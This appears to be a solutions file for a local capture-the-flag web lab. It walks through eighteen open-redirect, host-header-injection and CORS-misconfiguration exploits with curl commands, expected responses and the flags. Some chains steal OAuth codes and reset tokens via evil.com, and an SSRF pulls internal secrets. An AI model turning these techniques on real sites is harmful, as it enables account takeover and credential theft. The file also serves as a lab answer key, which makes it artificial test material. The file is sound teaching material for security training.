# Batch 09 solutions - Open Redirect, Host Header Injection, CORS Misconfiguration

Base URL below is `http://127.0.0.1:3109` (the verification port). Adjust the
port to wherever your lab instance runs. Every flag is awarded only when the
exploit genuinely succeeds, never on a plain page view.

## redirect - Open Redirect

**1. Protocol-Relative Redirect** - `PENTRIX{redirect_redirect-double-slash}`

```bash
curl -i "http://127.0.0.1:3109/redirect/go?next=//evil.com"
# HTTP/1.1 302 Found
# Location: //evil.com
```

Why it works: the `next` parameter is passed to the redirect with zero
validation, and a URL starting with `//` keeps the current scheme but navigates
to the attacker's host.

**2. javascript: Scheme Honored** - `PENTRIX{redirect_redirect-javascript}`

```bash
curl -i "http://127.0.0.1:3109/redirect/js?next=javascript:alert(1)"
# HTTP/1.1 302 Found
# Location: javascript:alert(1)
```

Why it works: the endpoint sets the `Location` header from user input with no
scheme allowlist, so a `javascript:` URL is honored verbatim.

**3. data: Scheme Honored** - `PENTRIX{redirect_redirect-data}`

```bash
curl -i "http://127.0.0.1:3109/redirect/data?next=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"
# HTTP/1.1 302 Found
# Location: data:text/html,<script>alert(1)</script>
```

Why it works: same missing scheme check as lab 2; a `data:text/html` URL
smuggles a whole attacker-controlled document through the redirect.

**4. Backslash Allowlist Bypass** - `PENTRIX{redirect_redirect-backslash}`

```bash
curl -i "http://127.0.0.1:3109/redirect/trusted?next=https:%5C%5Cevil.com"
# HTTP/1.1 302 Found
# Location: https:\\evil.com
```

(`%5C` is a URL-encoded backslash, so the payload is `https:\\evil.com`.)
A plain `?next=https://evil.com` is rejected with 400, proving the check runs.

Why it works: the naive allowlist compares the raw string prefix instead of the
parsed hostname and accepts backslash as a separator, while browsers and the
URL parser normalize `\` to `/`, so the real destination is evil.com.

**5. OAuth Code Theft via redirect_uri** - `PENTRIX{redirect_redirect-oauth-theft}`

Full chain (the victim is simulated with a cookie jar):

```bash
B=http://127.0.0.1:3109
AUTHZ="/redirect/oauth/authorize?client_id=pentrix-app&redirect_uri=http://127.0.0.1:3109/redirect/evil-collect"

# 1. victim "logs in", then returns to the authorize URL
curl -c jar -b jar -s -o /dev/null "$B/redirect/oauth/victim-login?then=%2Fredirect%2Foauth%2Fauthorize%3Fclient_id%3Dpentrix-app%26redirect_uri%3Dhttp%253A%252F%252F127.0.0.1%253A3109%252Fredirect%252Fevil-collect"

# 2. victim approves the app -> 302 straight to the attacker's page with the code
LOC=$(curl -s -b jar -i -X POST \
  --data "client_id=pentrix-app&redirect_uri=http://127.0.0.1:3109/redirect/evil-collect" \
  "$B/redirect/oauth/consent" | grep -i "^location:" | tr -d '\r' | cut -d' ' -f2)
echo "$LOC"
# http://127.0.0.1:3109/redirect/evil-collect?code=<server-issued code>

# 3. the attacker's collector receives the genuine code -> flag
curl -s "$LOC" | grep -o "PENTRIX{[^}]*}"
```

Why it works: `redirect_uri` is never validated against the client's registered
URLs, so the authorization code is delivered to the attacker's collector, where
it can be exchanged for an access token.

**6. Parameter Pollution Picks Last** - `PENTRIX{redirect_redirect-pollution}`

```bash
curl -i "http://127.0.0.1:3109/redirect/polluted?next=safe&next=https://evil.com"
# HTTP/1.1 302 Found
# Location: https://evil.com
```

Why it works: with duplicate `next` parameters the code silently honors the
last value; the first one is only camouflage for anyone reviewing the link.

## hostheader - Host Header Injection

**1. Password Reset Poisoning** - `PENTRIX{hostheader_host-reset-poison}`

```bash
B=http://127.0.0.1:3109
# attacker requests a reset for the victim with a poisoned Host header
TOKEN=$(curl -s -H "Host: evil.com" --data "email=alice@pentrix.lab" \
  "$B/hostheader/forgot" | grep -o "token=[a-f0-9]*" | head -1 | cut -d= -f2)
# the emailed link now points at evil.com; victim "clicks" it -> token harvested
curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
```

Why it works: the reset link is built from the untrusted `Host` header, so the
victim's valid token is delivered to the attacker's domain.

**2. Cache Poisoning via Host** - `PENTRIX{hostheader_host-cache-poison}`

```bash
B=http://127.0.0.1:3109
# step 1: poison the cache (page is keyed by path only, not by host)
curl -s -H "Host: evil.com" "$B/hostheader/app" -o /dev/null
# step 2: visit as a normal user -> served the poisoned page -> flag
curl -s "$B/hostheader/app" | grep -o "PENTRIX{[^}]*}"
# cleanup for repeat runs
curl -s "$B/hostheader/app/clear" -o /dev/null
```

Why it works: the portal page is cached by path alone, so the copy rendered
under the attacker's `Host` is served to every later visitor.

**3. SSRF via Host Header** - `PENTRIX{hostheader_host-ssrf}`

```bash
curl -s -H "Host: 127.0.0.1:13919" http://127.0.0.1:3109/hostheader/status \
  | grep -o "PENTRIX{[^}]*}"
# the page also prints the exfiltrated JSON: db_password, admin_api_key
```

Why it works: the server-side health check builds its fetch URL from the `Host`
header, so pointing it at `127.0.0.1:13919` makes the server fetch the
loopback-only internal monitoring agent and return its secrets.

**4. X-Forwarded-Host Poisoning** - `PENTRIX{hostheader_host-xforwarded}`

```bash
B=http://127.0.0.1:3109
TOKEN=$(curl -s -H "X-Forwarded-Host: evil.com" --data "email=bob@pentrix.lab" \
  "$B/hostheader/forgot-xfwd" | grep -o "token=[a-f0-9]*" | head -1 | cut -d= -f2)
curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
```

Why it works: behind a proxy this reset page trusts `X-Forwarded-Host` over
`Host`; same poisoning, different header.

**5. X-Host-Override Poisoning** - `PENTRIX{hostheader_host-override}`

```bash
B=http://127.0.0.1:3109
TOKEN=$(curl -s -H "X-Host-Override: evil.com" --data "email=bob@pentrix.lab" \
  "$B/hostheader/forgot-override" | grep -o "token=[a-f0-9]*" | head -1 | cut -d= -f2)
curl -s "$B/hostheader/evil-collect?token=$TOKEN" | grep -o "PENTRIX{[^}]*}"
```

Why it works: a vendor-specific variant of the same flaw; `X-Host-Override`
wins over `Host` when building the reset link.

**6. Absolute Continue URL** - `PENTRIX{hostheader_host-abs-url}`

```bash
curl -i -H "Host: evil.com" --data "username=alice&password=alice123" \
  http://127.0.0.1:3109/hostheader/login
# HTTP/1.1 302 Found
# Location: http://evil.com/hostheader/dashboard
```

(Demo accounts: alice/alice123, bob/bob123.)

Why it works: the post-login redirect is an absolute URL built from the `Host`
header, so a poisoned header sends the freshly authenticated victim to the
attacker's domain.

## cors - CORS Misconfiguration

Each lab is proven through `/cors/prove?vuln=<id>&origin=<Origin>`: the server
makes a real request to the vulnerable endpoint with that `Origin` and awards
the flag only when the vulnerable header combination is genuinely demonstrated.

**1. Reflected Origin with Credentials** - `PENTRIX{cors_cors-reflect}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-reflect&origin=https%3A%2F%2Fevil.com" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si -H "Origin: https://evil.com" .../cors/api/profile
#   -> Access-Control-Allow-Origin: https://evil.com
#   -> Access-Control-Allow-Credentials: true
```

Why it works: the endpoint reflects any `Origin` with credentials allowed and
no allowlist at all, so any website can read authenticated responses.

**2. Null Origin Trusted** - `PENTRIX{cors_cors-null}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-null&origin=null" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si -H "Origin: null" .../cors/api/settings
#   -> Access-Control-Allow-Origin: null + Access-Control-Allow-Credentials: true
```

Why it works: `Origin: null` (sandboxed iframes, file:// pages) is trusted with
credentials, handing the data to attacker-controlled null-origin contexts.

**3. Regex Allowlist Bypass** - `PENTRIX{cors_cors-regex}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-regex&origin=https%3A%2F%2Fpentrix.lab.evil.com" \
  | grep -o "PENTRIX{[^}]*}"
```

Why it works: the naive regex `^https://.*pentrix\.lab` has no subdomain
boundary and no end anchor, so `https://pentrix.lab.evil.com` matches while not
being under pentrix.lab. (Note: the commonly written anchored form
`^https://.*\.pentrix\.lab$` would NOT match this payload - the missing dot
before `pentrix` and the missing `$` are exactly the naive mistakes.)

**4. Wildcard on Sensitive Data** - `PENTRIX{cors_cors-wildcard-data}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-wildcard-data&origin=https%3A%2F%2Fevil.com" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si .../cors/api/users
#   -> Access-Control-Allow-Origin: *  + every user's email in the body
```

Why it works: a wildcard origin on an endpoint returning sensitive user data
means literally any website can read it.

**5. Subdomain Suffix Check** - `PENTRIX{cors_cors-subdomain}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-subdomain&origin=https%3A%2F%2Fevil.trusted.pentrix.lab" \
  | grep -o "PENTRIX{[^}]*}"
```

Why it works: the check is only `hostname.endsWith('.trusted.pentrix.lab')`
with no allowlist of real subdomains, so an attacker-controlled subdomain
passes.

**6. Exposed Admin Token Header** - `PENTRIX{cors_cors-expose-headers}`

```bash
curl -s "http://127.0.0.1:3109/cors/prove?vuln=cors-expose-headers&origin=https%3A%2F%2Fevil.com" \
  | grep -o "PENTRIX{[^}]*}"
# raw check: curl -si .../cors/api/token
#   -> X-Admin-Token: <secret>  +  Access-Control-Expose-Headers: X-Admin-Token
```

Why it works: the sensitive `X-Admin-Token` response header is listed in
`Access-Control-Expose-Headers`, so any website the victim visits can read it
with JavaScript.
